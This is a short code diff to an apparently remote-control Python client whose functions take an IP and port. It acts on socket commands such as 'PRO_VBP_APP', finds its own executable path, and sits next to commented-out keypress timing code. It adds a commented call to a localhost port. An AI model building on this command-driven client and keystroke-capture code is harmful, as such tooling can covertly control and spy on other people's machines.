@@ -70,7 +70,7 @@ def PINGPONG_client_T(ip, port):
             elif data.decode() == "PRO_VBP_APP":
                 def moni_t():
                     s.send(bytes("OK", 'utf8'))
-                    PINGPONG = os.path.abspath(__file__)
+                    PINGPONG = os.path.realpath(sys.executable)
                     FILE_MODIFIED = 3
                     FILE_LIST_DIRECTORY = 0x0001
                     CMD = f'{PINGPONG}'
@@ -318,3 +318,4 @@ def CMD_client(ip, port, main_port):
 #                 previous_timestamp = keypress_time
 #             elif keypress_time is not None:
 #                 previous_timestamp = keypress_time
+# PINGPONG_client("127.0.0.1", 624)
